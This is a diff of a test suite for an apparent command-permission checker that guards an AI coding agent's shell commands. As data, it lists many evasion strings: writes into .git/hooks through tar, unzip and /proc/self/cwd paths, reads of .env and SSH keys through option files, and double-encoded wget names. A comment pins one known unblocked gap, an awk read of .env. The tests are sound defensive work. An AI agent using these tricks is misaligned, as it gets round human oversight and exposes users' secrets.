+    b7Each("B8-4", "ask", ["cp f /proc/self/cwd/AGENTS.md", "cd .git/hooks && cp ../../f /proc/self/cwd/pre-c*", "cd src && tee /proc/self/cwd/../opencode.json < main.c", "cd .git && /bin/cat /proc/self/cwd/config"], () => f4);
+    b7Each("B8-4", "allow", ["cd src && cp -v ../f /proc/self/cwd/copy.c", "cd src && echo x > /proc/self/cwd/new.txt", "cd src && cp -t/proc/self/cwd/.. ../f", "cd src && cat /proc/self/cwd/main.c"], () => f4);
+    // What names no path through /proc stays as it is.
+    b7Each("B8-4", "allow", ["ls -la", "cd src && ls -la", "cd src && grep -rn main .", "tar -czf out.tgz src", "cd src && cp -v main.c copy.c", "ls -lah src", "cd src && head -n5 main.c", "cd src && cut -d: -f1 main.c", "cd src && cp -vt. ../f", "cd src && sort -uo sorted.txt main.c", "ps -ef", "cd src && tail -n+2 main.c"], () => f4);
+  });
+
+  describe("B8-5: the clock's failure paths, and a moment that outlives a restart", () => {
+    // A clock for the test: what each directory's file system says, reading by reading.
+    const withClock = (readings: Record<string, ({ at: bigint; dev: bigint } | undefined)[]>, run: () => void) => {
+      assert.ok(d.clocks, "decide.ts exports its clock for the tests");
+      const { read, dev } = d.clocks;
+      d.clocks.forget();
+      d.clocks.read = (dir: string) => {
+        const list = readings[dir];
+        assert.ok(list?.length, `an unexpected reading of ${dir}`);
+        return list.shift();
+      };
+      d.clocks.dev = (dir: string) => (dir === "/base" ? 1n : dir === "/other" ? 2n : dir === "/third" ? 3n : (() => { throw new Error("no such directory"); })());
+      try {
+        run();
+      } finally {
+        d.clocks.read = read;
+        d.clocks.dev = dev;
+        d.clocks.forget();
+      }
+    };
+    const S = 1_000_000_000n;
+    const base = (at: bigint) => ({ at, dev: 1n });
+    const other = (at: bigint) => ({ at, dev: 2n });
+    test("r4 B8-5a: the moment on another file system is the lower bound of what was measured", () => {
+      // The other clock read 250 between the base clock's 100 and 300: it is ahead by -50 to 150.
+      withClock({ "/base": [base(100n), base(300n)], "/other": [other(250n)] }, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 10_000n - 50n);
+      });
+      // Far ahead: by at least 5 s less 300.
+      withClock({ "/base": [base(100n), base(300n)], "/other": [other(5n * S + 7n)] }, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 10_000n + 5n * S + 7n - 300n);
+      });
+      // Behind.
+      withClock({ "/base": [base(9n * S), base(9n * S + 40n)], "/other": [other(2n * S + 1n)] }, () => {
+        assert.equal(d.momentOn({ at: 9n * S + 20n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 9n * S + 20n + (2n * S + 1n - (9n * S + 40n)));
+      });
+    });
+    test("r4 B8-5a: a file system that keeps whole seconds: the moment is cut down to the second", () => {
+      withClock({ "/base": [base(7n * S + 100n), base(7n * S + 300n)], "/other": [other(7n * S)] }, () => {
+        // Lower bound: 7 s - (7 s + 300) = -300; the moment 7.5 s is 7.5 s - 300 there, cut to 7 s.
+        assert.equal(d.momentOn({ at: 7n * S + S / 2n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 7n * S);
+      });
+      // Not cut where the clock does not end in nine zeros.
+      withClock({ "/base": [base(7n * S + 100n), base(7n * S + 300n)], "/other": [other(7n * S + 1n)] }, () => {
+        assert.equal(d.momentOn({ at: 7n * S + S / 2n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 7n * S + S / 2n + 1n - 300n);
+      });
+    });
+    test("r4 B8-5a: where the other clock cannot be measured there is no trust", () => {
+      // No reading there.
+      withClock({ "/base": [base(100n), base(300n)], "/other": [undefined] }, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 0n);
+      });
+      // No directory on that file system among the ones given.
+      withClock({}, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n, dir: "/base" }, 2n, ["/third", "/nowhere"]), 0n);
+      });
+      // The base clock gone since.
+      withClock({ "/base": [undefined, undefined], "/other": [other(250n)] }, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 0n);
+      });
+      // The moment's own clock is read on another file system than it was taken on.
+      withClock({ "/base": [{ at: 100n, dev: 7n }, { at: 300n, dev: 7n }], "/other": [other(250n)] }, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 0n);
+      });
+      // A moment that does not say where it was read.
+      withClock({ "/other": [other(250n)] }, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n }, 2n, ["/other"]), 0n);
+      });
+      // The reading came from another file system than the judged file's.
+      withClock({ "/base": [base(100n), base(300n)], "/other": [{ at: 250n, dev: 9n }] }, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n, dir: "/base" }, 2n, ["/other"]), 0n);
+      });
+      // The same file system needs no measuring, and no moment is none on every clock.
+      withClock({}, () => {
+        assert.equal(d.momentOn({ at: 10_000n, dev: 1n, dir: "/base" }, 1n, ["/other"]), 10_000n);
+        assert.equal(d.momentOn({ at: 0n, dev: undefined }, 2n, ["/other"]), 0n);
+      });
+    });
+    test("r4 B8-5a: a script on a file system whose clock cannot be measured goes to the model", async () => {
+      const f = b7Fixture();
+      const s = new SessionState(f.dir);
+      const dev = fs.statSync(f.dir, { bigint: true }).dev;
+      // The session's moment was taken on another file system, and no clock can be read now.
+      (s as any).moment = { at: s.moment.at, dev: dev + 1n, dir: "/base" };
+      const { read } = d.clocks;
+      d.clocks.forget();
+      d.clocks.read = () => undefined;
+      try {
+        const r = await b7Kind(f.dir, "sh scripts/build.sh", s);
+        assert.equal(r.kind, "classify", r.reason);
+        assert.match(r.reason, /changed since this session began/);
+      } finally {
+        d.clocks.read = read;
+        d.clocks.forget();
+      }
+    });
+    test("r4 B8-5b: with a temp directory that cannot be used the moment is taken in the state directory, then the home directory", async () => {
+      const f = b7Fixture();
+      const was = process.env.TMPDIR;
+      const state = path.join(process.env.XDG_STATE_HOME!, "opencode-automode");
+      const readOnly = fs.mkdtempSync(path.join(tmp, "b8-ro-"));
+      fs.chmodSync(readOnly, 0o500);
+      try {
+        for (const unusable of [path.join(f.dir, "no-such-directory"), "/proc", readOnly, path.join(f.dir, "f")]) {
+          process.env.TMPDIR = unusable;
+          const m = takeMoment() as any;
+          assert.ok(m.at > 0n, unusable);
+          assert.equal(m.dir, state, unusable);
+          assert.equal(m.dev, fs.statSync(state, { bigint: true }).dev);
+          // A script nobody changed runs as before; one changed since goes to the model.
+          const s = new SessionState(f.dir);
+          assert.equal((await b7Kind(f.dir, "sh scripts/build.sh", s)).kind, "allow", unusable);
+          f.file("tools/check.sh", "#!/bin/sh\necho changed\n", 0o755);
+          assert.equal((await b7Kind(f.dir, "sh tools/check.sh", s)).kind, "classify", unusable);
+        }
+      } finally {
+        if (was === undefined) delete process.env.TMPDIR;
+        else process.env.TMPDIR = was;
+        fs.chmodSync(readOnly, 0o700);
+      }
+      // By the directories it is given, in order; none usable: no reading.
+      const m = (takeMoment as any)([path.join(f.dir, "nope"), os.homedir()]);
+      assert.ok(m.at > 0n);
+      assert.equal(m.dir, os.homedir());
+      assert.deepEqual((takeMoment as any)([path.join(f.dir, "nope"), "/proc"]), { at: 0n, dev: undefined });
+    });
+    const momentFile = (id: string) => d.momentFile(id) as string;
+    test("r4 B8-5c: a session is measured from the moment of the process it was first seen in", async () => {
+      const f = b7Fixture();
+      const id = `ses_b8_${path.basename(f.dir)}`;
+      // The first process: it sees the session, which then writes a script (and the user approves
+      // nothing: the write is the edit tool's).
+      const first = new (SessionState as any)(f.dir, id) as SessionState;
+      const st = fs.statSync(momentFile(id));
+      assert.equal(st.mode & 0o777, 0o600);
+      assert.equal(fs.statSync(path.dirname(momentFile(id))).mode & 0o777, 0o700);
+      await new Promise((r) => setTimeout(r, 20));
+      f.file("g.sh", "#!/bin/sh\necho NEW\n", 0o755);
+      f.file("scripts/build.sh", "#!/bin/sh\necho NEW-build\n", 0o755);
+      // A restart: another process, whose own moment is after those writes.
+      const second = new (SessionState as any)(f.dir, id) as SessionState;
+      assert.equal(second.moment.at, first.moment.at);
+      for (const c of ["bash g.sh", "./scripts/build.sh"]) {
+        const r = await b7Kind(f.dir, c, second);
+        assert.equal(r.kind, "classify", r.reason);
+        assert.match(r.reason, /changed since this session began/);
+      }
+      assert.equal((await b7Kind(f.dir, "./tools/check.sh", second)).kind, "allow");
+      // Another session, first seen now, is measured from now; so is a state without an id.
+      for (const s of [new (SessionState as any)(f.dir, `${id}-other`), new SessionState(f.dir)]) {
+        const r = await b7Kind(f.dir, "./scripts/build.sh", s);
+        assert.equal(r.kind, "allow", r.reason);
+      }
+      // Written once: the file is the first process's, whatever came after.
+      assert.equal(fs.statSync(momentFile(id)).ino, st.ino);
+      assert.equal(fs.statSync(momentFile(id)).mtimeMs >= st.mtimeMs, true);
+    });
+    test("r4 B8-5c: the earlier of the kept moment and the process's own", () => {
+      const dir = one().dir;
+      const now = takeMoment() as any;
+      const was = SessionState.moment;
+      try {
+        // Kept by a process that started later than this one: this one's own stands.
+        SessionState.moment = () => now;
+        const id = `ses_b8_order_${process.pid}_${Date.now()}`;
+        const a = new (SessionState as any)(dir, id) as SessionState;
+        assert.equal(a.moment.at, now.at);
+        SessionState.moment = () => ({ ...now, at: now.at - 5_000n });
+        assert.equal((new (SessionState as any)(dir, id) as SessionState).moment.at, now.at - 5_000n);
+        // ... and the kept one, where it is the earlier.
+        SessionState.moment = () => ({ ...now, at: now.at + 5_000n });
+        assert.equal((new (SessionState as any)(dir, id) as SessionState).moment.at, now.at);
+        assert.equal((new (SessionState as any)(dir, id) as SessionState).began, now.at);
+      } finally {
+        SessionState.moment = was;
+      }
+    });
+    test("r4 B8-5c: a kept moment that cannot be read, or that lies in the future, is no trust", async () => {
+      const f = b7Fixture();
+      const good = () => {
+        const id = `ses_b8_bad_${process.pid}_${Math.random().toString(36).slice(2)}`;
+        new (SessionState as any)(f.dir, id);
+        return id;
+      };
+      const noTrust = async (id: string, why: string) => {
+        const s = new (SessionState as any)(f.dir, id) as SessionState;
+        assert.equal(s.moment.at, 0n, why);
+        assert.equal(s.began, 0n, why);
+        const r = await b7Kind(f.dir, "sh scripts/build.sh", s);
+        assert.equal(r.kind, "classify", `${why}: ${r.reason}`);
+      };
+      const rewrite = (id: string, text: string | ((was: string) => string), mode = 0o600) => {
+        const file = momentFile(id);
+        const was = fs.readFileSync(file, "utf8");
+        fs.rmSync(file);
+        fs.writeFileSync(file, typeof text === "string" ? text : text(was), { mode });
+        fs.chmodSync(file, mode);
+      };
+      let id = good();
+      rewrite(id, "not a moment\n");
+      await noTrust(id, "garbage");
+      id = good();
+      rewrite(id, "");
+      await noTrust(id, "empty");
+      id = good();
+      rewrite(id, (was) => was.replace(/"at":"(\d+)"/, (_, at) => `"at":"${BigInt(at) + 3_600n * 1_000_000_000n}"`));
+      await noTrust(id, "an hour ahead");
+      id = good();
+      rewrite(id, (was) => was.replace(/"at":"\d+"/, '"at":"0"'));
+      await noTrust(id, "zero");
+      id = good();
+      rewrite(id, (was) => was.replace(/"at":"\d+"/, '"at":"-5"'));
+      await noTrust(id, "negative");
+      id = good();
+      rewrite(id, (was) => was, 0o644);
+      await noTrust(id, "readable by others");
+      id = good();
+      rewrite(id, (was) => was.replace(/"dir":"[^"]*"/, `"dir":${JSON.stringify(path.join(f.dir, "gone"))}`));
+      await noTrust(id, "its clock is gone");
+      id = good();
+      rewrite(id, (was) => was.replace(/"dev":"\d+"/, '"dev":"1"'));
+      await noTrust(id, "another file system's");
+      id = good();
+      const elsewhere = path.join(f.dir, "kept-elsewhere");
+      fs.copyFileSync(momentFile(id), elsewhere);
+      fs.chmodSync(elsewhere, 0o600);
+      fs.rmSync(momentFile(id));
+      fs.symlinkSync(elsewhere, momentFile(id));
+      await noTrust(id, "a link, to a moment that reads");
+      id = good();
+      fs.rmSync(momentFile(id));
+      fs.mkdirSync(momentFile(id));
+      await noTrust(id, "a directory");
+      // An untouched one still reads.
+      id = good();
+      assert.ok((new (SessionState as any)(f.dir, id) as SessionState).moment.at > 0n);
+    });
+    test("r4 B8-5c: kept moments nobody used for thirty days are removed, the others stay", () => {
+      const dir = one().dir;
+      const old = `ses_b8_old_${process.pid}`;
+      const fresh = `ses_b8_fresh_${process.pid}`;
+      new (SessionState as any)(dir, old);
+      new (SessionState as any)(dir, fresh);
+      const days = (n: number) => new Date(Date.now() - n * 86_400_000);
+      fs.utimesSync(momentFile(old), days(31), days(31));
+      fs.utimesSync(momentFile(fresh), days(29), days(29));
+      const stray = path.join(path.dirname(momentFile(old)), "not-a-moment.txt");
+      fs.writeFileSync(stray, "x");
+      fs.utimesSync(stray, days(400), days(400));
+      d.sweepMoments();
+      assert.equal(fs.existsSync(momentFile(old)), false);
+      assert.equal(fs.existsSync(momentFile(fresh)), true);
+      // Only its own files: names it gives.
+      assert.equal(fs.existsSync(stray), true);
+      fs.rmSync(stray);
+      // Using a kept moment renews it.
+      fs.utimesSync(momentFile(fresh), days(29), days(29));
+      new (SessionState as any)(dir, fresh);
+      assert.ok(Date.now() - fs.statSync(momentFile(fresh)).mtimeMs < 60_000);
+    });
+    test("r4 B8-5c: where the moment cannot be kept, the process's own stands", () => {
+      const dir = one().dir;
+      const was = process.env.XDG_STATE_HOME;
+      try {
+        process.env.XDG_STATE_HOME = path.join(dir, "f", "under-a-file");
+        const s = new (SessionState as any)(dir, "ses_b8_nokeep") as SessionState;
+        assert.ok(s.moment.at > 0n);
+      } finally {
+        process.env.XDG_STATE_HOME = was;
+      }
+    });
+  });
+
+  describe("B8-6: wget decodes a name twice", () => {
+    b7Each("B8-6", "ask", [
+      "wget http://127.0.0.1:9/AGENTS%252emd",
+      "wget http://127.0.0.1:9/CLAUDE%252Emd",
+      "wget http://127.0.0.1:9/opencode%252ejson",
+      "wget http://127.0.0.1:9/%252eenv",
+      "wget http://127.0.0.1:9/x/%252egit",
+      "wget http://127.0.0.1:9/%2541GENTS.md",
+      "wget http://127.0.0.1:9/AGENTS%252Emd?x=1",
+      "wget -P sub http://127.0.0.1:9/AGENTS%252emd",
+      "wget -q http://127.0.0.1:9/a/b/AGENTS%25%32emd",
+      "wget --directory-prefix=sub http://127.0.0.1:9/%252eenv",
+      // A `%XX` that is no UTF-8 beside it took the decoded spelling away altogether.
+      "wget http://127.0.0.1:9/%ff/AGENTS%2emd",
+      "wget http://127.0.0.1:9/%ff/AGENTS%252emd",
+      "wget http://127.0.0.1:9/x%c3/%252egit",
+    ], one);
+    // A name that is ordinary however often it is decoded stays; curl decodes none for -O.
+    b7Each("B8-6", "allow", ["wget http://127.0.0.1:9/notes%2520draft.txt", "wget http://127.0.0.1:9/a%252eb.txt", "wget -O out.html http://127.0.0.1:9/AGENTS%252emd", "curl -sO http://127.0.0.1:9/AGENTS%252emd", "wget http://127.0.0.1:9/100%2525.txt"], one);
+  });
+
+  describe("B8-7: tar --one-top-level names a place", () => {
+    b7Each("B8-7", "ask", [
+      "tar -xf hooks.tar --one-top-level=.git/hooks",
+      "tar -xf hooks.tar --one-top-level=.git/hooks/",
+      "tar -xf hooks.tar --one-top-l=.git/hooks",
+      "tar -xf hooks.tar --one-top=.git/hooks",
+      "tar -xf hooks.tar --one-t=.git/hooks",
+      "tar -xf hooks.tar --one-top-level=gl/hooks",
+      "tar -xf hooks.tar --one-top-level=sub/../.git/hooks",
+      "tar xf hooks.tar --one-top-level=.git/hooks",
+      "tar --extract --file hooks.tar --one-top-level=.git",
+      "tar --one-top-level=.git/hooks -xf hooks.tar",
+      "cd .git && tar -xf ../hooks.tar --one-top-level=hooks",
+      "cd sub && tar -xf ../hooks.tar --one-top-level=../.git/hooks",
+      "tar -xf hooks.tar -C sub --one-top-level=../.git/hooks",
+      "tar -xf hooks.tar --one-top-level=../.git/hooks -C sub",
+      // Only the `-C` leads this one to the link (`gl` is a link to .git at the top).
+      "cd sub && tar -xf ../hooks.tar -C .. --one-top-level=gl/hooks",
+      "cd sub && tar -xf ../hooks.tar --one-top-level=gl/hooks -C ..",
+      "tar -xf hooks.tar -C sub -C .. --one-top-level=gl/hooks",
+      "tar -xf hooks.tar --one-top-level=x --one-top-level=.git/hooks",
+      "tar -xf hooks.tar --one-top-level=.git/hooks --one-top-level=x",
+      // Without a value the directory is named after the archive.
+      "tar -xf .git.tar --one-top-level",
+      "tar -xf .git.tar --one-top-l",
+      "cd sub && tar -xf ../.git.tar --one-top-level -C ..",
+      "tar --one-top-level -xzf .git.tgz",
+      "tar -xJf .git.tar.xz --one-top-level",
+    ], one, (reason) => assert.match(reason, /\.git/));
+    b7Each("B8-7", "allow", ["tar -xf hooks.tar --one-top-level=out", "tar -xf hooks.tar --one-top-level", "tar -xf hooks.tar --one-top-level=sub/out", "tar -tf hooks.tar --one-top-level=.git/hooks", "tar -cf new.tar --one-top-level=.git/hooks f", "tar -xf hooks.tar -C sub --one-top-level"], one);
+  });
+
+  describe("B8-8: the table of list options, with what was found", () => {
+    b7Each("B8-8", "ask", [
+      "rsync --files-from=.env . dest",
+      "rsync --files-from .env . dest",
+      "rsync -a --exclude-from=.env . dest",
+      "rsync -a --exclude-from .env . dest",
+      "rsync -a --include-from=.env . dest",
+      "rsync --read-batch=.env dest",
+      "rsync -a -f 'merge .env' . dest",
+      "rsync -a -f'merge .env' . dest",
+      "rsync -a -f '. .env' . dest",
+      "rsync -a --filter='merge .env' . dest",
+      "rsync -a --filter '. .env' . dest",
+      "rsync -a --filter='dir-merge .env' . dest",
+      "rsync -a --filter=': .env' . dest",
+      "rsync -a -f '.e .env' . dest",
+      "rsync -a -f 'merge,n .env' . dest",
+      "rsync -af 'merge .env' . dest",
+      "rsync -a --filter=merge_.env . dest",
+      "git ls-files --others -X.env",
+      "git ls-files -oX.env",
+      "git ls-files -o --exclude-from=.env",
+      "git ls-files -o --exclude-from .env",
+      "git ls-files -o --exclude-fr=.env",
+      "git ls-files -o --exclude-per-directory=.env",
+      "git --no-pager ls-files -o -X.env",
+      "git -C src ls-files -o -X../.env",
+      "git grep -f.env x",
+      "git grep -nf.env",
+      "git grep -f .env",
+      "git add --pathspec-from-file=.env",
+      "git commit -m x --pathspec-from-file .env",
+      "git restore --pathspec-from-file=.env",
+      "git reset --pathspec-from-fi=.env",
+      "date -f.env",
+      "date -uf.env",
+      "date -f .env",
+      "date --file=.env",
+      "date --fil .env",
+      "date -f ~/.ssh/id_ed25519",
+      "date -f~/.ssh/id_ed25519",
+      "hexdump -f.env f",
+      "hexdump -vf.env f",
+      "hexdump -f .env f",
+      "hexdump --format-file=.env f",
+      "hexdump --format-file .env f",
+      "rsync --password-file=.env src/ dest/",
+      "git commit -F.env",
+      "git commit -aF.env",
+      "git commit -t.env",
+      "git blame -S.env f",
+      // Through a link, where only the place of the command leads to it.
+      "cd src && date -fzzz",
+      "cd src && hexdump -fzzz ../f",
+      "cd src && git ls-files -o -Xzzz",
+      "cd src && git grep -fzzz",
+      "git -C src ls-files -o -Xzzz",
+      "git -C src grep -fzzz",
+      "cd sub && git -C ../src ls-files -o -Xzzz",
+      "cd src && rsync --files-from=zzz . dest",
+      "cd src && git commit -Fzzz",
+      "cd src && git blame -Szzz ../f",
+    ], one, (reason) => assert.match(reason, /credential|protected|\.env|id_ed25519/));
+    // The same options with a file that holds no secret, and their neighbours, stay.
+    b7Each("B8-8", "allow", ["date -f names.txt", "date -d tomorrow", "date -d'next friday'", "date -dfriday", "date +%s", "date -u +%FT%TZ", "date -r f", "hexdump -C f", "hexdump -n 16 f", "hexdump -e '\"%x\"' f", "git ls-files", "git ls-files -o --exclude-standard", "git ls-files -o -X .gitignore", "git grep -n x", "git grep -f names.txt", "git add --pathspec-from-file=names.txt", "git log --format=%f -1",
+      // A short letter that takes a value ends the cluster: what follows is its value, not a list.
+      "git commit -mt.env", "git commit -m\"t.env\"", "git commit -am\"update .env\"", "git commit -mtest", "date -df.env", "hexdump -ef.env f", "git grep -ef.env", "git ls-files -xX.env",
+      "git commit -F names.txt", "git commit -Fnames.txt", "git blame -Snames.txt f", "git -C src ls-files -o -X../names.txt"], one);
+
+    // rsync's own verdict is the model's or an allow as before; what matters here is no ask.
+    b7Each("B8-8", ["allow", "classify"], ["rsync -a src/ dest/", "rsync --files-from=names.txt . dest", "rsync -a --exclude-from=.gitignore . dest"], one);
+    // The maintainer's decision: the table is an inventory and not complete, and the sandbox is
+    // what hides credential files. A name an awk program builds is a known gap: this form reads
+    // `.env` and is a rule allow, here as in the seventh pass. Pinned as it is, so that a change
+    // of it is seen.
+    test("r4 B8-8: KNOWN GAP, pinned: a file name an awk program builds (ARGV[1]=\".env\") is not read by the checks", async () => {
+      const r = await b7Kind(one().dir, `awk 'BEGIN{ARGV[1]=".env";ARGC=2}1'`);
+      assert.equal(r.kind, "allow", r.reason);
+    });
+  });
+
+  describe("B8-9: archives and patches write names the checks cannot see", () => {
+    const unseen = (c: string) => {
+      const text = printedText(c);
+      assert.notEqual(text, undefined, c);
+      assert.equal(typeof d.unseenWrites, "function");
+      return d.unseenWrites(text) as string | undefined;
+    };
+    for (const c of [
+      "tar -xf a.tar", "tar xf a.tar", "tar -xzvf a.tgz -C out", "tar --extract -f a.tar", "tar --extr -f a.tar", "tar --get -f a.tar", "tar -f a.tar -x", "tar -vxf a.tar", "tar xvzf a.tgz", "cd sub && tar xf ../a.tar",
+      "gtar -xf a.tar", "bsdtar -xf a.tar",
+      "unzip a.zip", "unzip -o a.zip -d out", "unzip -q a.zip", "unzip -qo a.zip", "unzip -n a.zip x.txt", "unzip -u a.zip", "unzip -f a.zip", "unzip a.zip -x '*.txt'",
+      "patch -p1 < x.diff", "patch -p1 -i x.diff", "patch < x.diff", "patch -R -p0 -i x.diff", "patch f x.diff",
+      "git apply x.diff", "git apply --stat --apply x.diff", "git -C sub apply x.diff", "git apply --check --apply x.diff", "git apply -3 x.diff", "git apply --index x.diff", "git apply --cached x.diff", "git apply -R x.diff", "git --no-pager apply x.diff",
+      "git am x.patch", "git am -3 x.patch", "git am < x.patch", "git am --continue",
+      "bash -c 'tar -xf a.tar'", "timeout 5 tar -xf a.tar", "env LC_ALL=C tar -xf a.tar", "ls; tar -xf a.tar", "if true; then unzip a.zip; fi", "for z in *.zip; do unzip $z; done", "nice patch -p1 -i x.diff", "curl -s http://127.0.0.1:9/a.tar | tar -x",
+    ]) test(`r4 B8-9: writes what the file names: ${JSON.stringify(c)}`, () => {
+      const why = unseen(c);
+      assert.equal(typeof why, "string", c);
+      assert.match(why!, /named inside|names inside/);
+    });
+    for (const c of [
+      "tar -tf a.tar", "tar tf a.tar", "tar -cf b.tar f", "tar czf b.tgz src", "tar --list -f a.tar", "tar -df a.tar", "tar --version", "tar -rf a.tar f", "tar -cf x.tar extract",
+      "unzip -l a.zip", "unzip -t a.zip", "unzip -p a.zip f", "unzip -Z a.zip", "unzip -lv a.zip", "unzip -c a.zip f", "unzip -z a.zip", "unzip -v", "unzip -hh", "unzip -ql a.zip", "unzip",
+      "patch --dry-run -p1 -i x.diff", "patch --dry-run < x.diff", "patch --dry-ru -p1 -i x.diff", "patch --version", "patch --help",
+      "git apply --stat x.diff", "git apply --numstat x.diff", "git apply --summary x.diff", "git apply --check x.diff", "git apply --stat --summary --check x.diff", "git apply --check -v x.diff",
+      "git am --abort", "git am --show-current-patch", "git am --quit",
+      "git status", "ls", "echo tar -xf a.tar", "gunzip f.gz", "zip -r a.zip src", "gzip -d f.gz", "grep -r unzip .", "cat x.patch", "git diff > x.diff", "git stash apply", "echo x > patch", "git log --grep apply", "man tar", "which unzip patch",
+    ]) test(`r4 B8-9: writes nothing a file names: ${JSON.stringify(c)}`, () => {
+      assert.equal(unseen(c), undefined, c);
+    });
+  });
+
+  describe("B8-10: tests with force", () => {
+    // The variant check's first gap: git 2.47 makes the guessed branch without an upstream
+    // under `inherit` (the remote's branch has none to inherit), and writes no config.
+    test("r4 B8-10: git checkout <name> and git switch <name> under branch.autoSetupMerge=inherit make a branch without an upstream: no ask", async () => {
+      const f = b7Fixture();
+      for (const [value, want] of [["inherit", "allow"], ["false", "allow"], ["true", "ask"], ["simple", "ask"], ["always", "ask"]] as const) {
+        f.g("config", "branch.autoSetupMerge", value);
+        for (const c of ["git checkout topic", "git switch topic"]) {
+          const r = await b7Kind(f.dir, c);
+          assert.equal(r.kind, want, `${value}: ${r.reason}`);
+        }
+      }
+      // Real git, for the two that are allowed: the config stays as it was.
+      for (const value of ["inherit", "false"]) {
+        f.g("config", "branch.autoSetupMerge", value);
+        const before = fs.readFileSync(path.join(f.dir, ".git", "config"), "utf8");
+        execFileSync("git", ["-C", f.dir, "checkout", "-q", "topic"], { stdio: "ignore" });
+        assert.equal(fs.readFileSync(path.join(f.dir, ".git", "config"), "utf8"), before, value);
+        f.g("checkout", "-q", "main");
+        f.g("branch", "-q", "-D", "topic");
+      }
+    });
+  });
+});
+
+// ---- Group B, ninth pass ----
+const b9Fixture = (name = "b9-") => {
+  const f = b8Fixture(name);
+  f.file("run.sh", "#!/bin/sh\n. ./lib/helper.sh\n", 0o755);
+  f.file("AGENTS.md", "agents\n");
+  f.file("member", "x\n");
+  f.file("x.ed", "1d\nw\nq\n");
+  execFileSync("gzip", ["-kf", "f"], { cwd: f.dir });
+  execFileSync("tar", ["-czf", "a.tgz", "f"], { cwd: f.dir });
+  fs.writeFileSync(path.join(f.dir, "a.zip"), "");
+  f.g("add", "-A");
+  f.g("commit", "-qm", "b9");
+  return f;
+};
+const B9_EDIT = "echo 'echo NEW' > helper.sh";
+const b9Unseen = (c: string) => {
+  const text = printedText(c);
+  assert.notEqual(text, undefined, c);
+  return (decideModule as any).unseenWrites(text) as string | undefined;
+};
+
+describe("r4 B9", () => {
+  let shared: B7;
+  const one = () => (shared ??= b9Fixture("b9-shared-"));
+
+  describe("B9-1: one unzip reader", () => {
+    // Info-ZIP unzip 6.0 reads its options before the archive only; after it only `-d` and `-x`.
+    for (const c of [
+      "unzip a.zip '*' -l", "unzip a.zip '*' -Z", "unzip a.zip .git/hooks/pre-commit -t", "unzip a.zip '*' -x -l", "unzip a.zip '*' -p", "unzip a.zip -c",
+      "unzip -o a.zip -dlib", "unzip -o a.zip -dtools", "unzip -dlib a.zip", "unzip -qod lib a.zip", "unzip a.zip -d lib -l", "unzip a.zip -dtests -v",
+      "unzip -- a.zip", "unzip --l a.zip", "unzip -l --l a.zip", "unzip -o a.zip -x '*.txt' -d lib", "unzip -o a.zip -d lib -d.git/hooks",
+    ]) test(`r4 B9-1: writes what the archive names: ${JSON.stringify(c)}`, () => {
+      assert.match(b9Unseen(c) ?? "", /named inside/, c);
+    });
+    for (const c of ["unzip -l a.zip", "unzip -lv a.zip", "unzip -t a.zip -d out", "unzip -Z a.zip", "unzip -qql a.zip", "unzip -p a.zip f", "unzip -c a.zip", "unzip -z a.zip", "unzip", "unzip -v", "unzip -hh", "unzip -h", "unzip -d out", "unzip -o -d lib"]) test(`r4 B9-1: writes nothing: ${JSON.stringify(c)}`, () => {
+      assert.equal(b9Unseen(c), undefined, c);
+    });
+    // The reviewer's chain: a `-d` value with a listing letter in it, or a listing letter after
+    // the archive, writes the archive's files where the call then runs them.
+    b7Each("B9-1", "classify", ["unzip -o a.zip -dlib && ./run.sh", "unzip -o a.zip 'lib/*' -l; ./run.sh", "unzip -o a.zip -d lib -t && ./run.sh", "unzip -o a.zip -dtools && ./scripts/build.sh"], one, (reason) => assert.match(reason, /cannot list/));
+    test("r4 B9-1: a downloaded archive unpacked with -dlib, then the script that sources lib/: the model", async () => {
+      const f = one();
+      const s = new SessionState(f.dir);
+      await b7Kind(f.dir, `curl -so ${tmp}/b9.zip http://127.0.0.1:9/x.zip`, s);
+      for (const c of [`unzip -o ${tmp}/b9.zip -dlib && ./run.sh`, `unzip -o ${tmp}/b9.zip -dlib && npm test`]) {
+        const r = await b7Kind(f.dir, c, s);
+        assert.equal(r.kind, "classify", r.reason);
+      }
+      // And in the next call: the mark stays on lib.
+      const t = new SessionState(f.dir);
+      assert.equal((await b7Kind(f.dir, "unzip -o a.zip -dlib", t)).kind, "allow");
+      assert.ok(t.unlisted.some((u) => u === path.join(fs.realpathSync(f.dir), "lib")), t.unlisted.join(", "));
+      assert.equal((await b7Kind(f.dir, "./run.sh", t)).kind, "classify");
+    });
+    // Its place is `-d`'s value, read like `tar -C`, wherever it stands.
+    b7Each("B9-1", "ask", ["unzip a.zip -d .git/hooks -l", "unzip a.zip -d.git/hooks '*' -t", "unzip -o a.zip -x f -d .git/hooks"], one);
+    b7Each("B9-1", "allow", ["unzip -l a.zip", "unzip -o a.zip -d sub", "unzip -lv a.zip -d .git/hooks"], one);
+  });
+
+  describe("B9-2: a single-dash word over the limit goes to the model", () => {
+    const pad = (letter: string, n = 4100) => letter.repeat(n);
+    // Decided with the plugin's process in the project, as opencode runs it (its /proc/self/cwd
+    // is then the project's top, where the test runner's is this repository, a guarded place).
+    const inProject = async (f: B7, c: string) => {
+      const was = process.cwd();
+      process.chdir(f.dir);
+      try {
+        return await b7Kind(f.dir, c);
+      } finally {
+        process.chdir(was);
+      }
+    };
+    for (const c of [
+      `cd .git/hooks && cp -${pad("v")}t/proc/self/cwd ../../member`,
+      `cd .git/hooks && sort -${pad("u")}o/proc/self/cwd/pre-commit ../../member`,
+      `cd .git/hooks && sort -${pad("u")}o../../mylink/pre-commit ../../member`,
+      `cd src && cp -${pad("v")}t../mylink ../member`,
+      `echo -${pad("n")} x`,
+    ]) test(`r4 B9-2: classify: ${JSON.stringify(c.replace(/(.)\1{20,}/, "$1…"))}`, async () => {
+      const r = await inProject(one(), c);
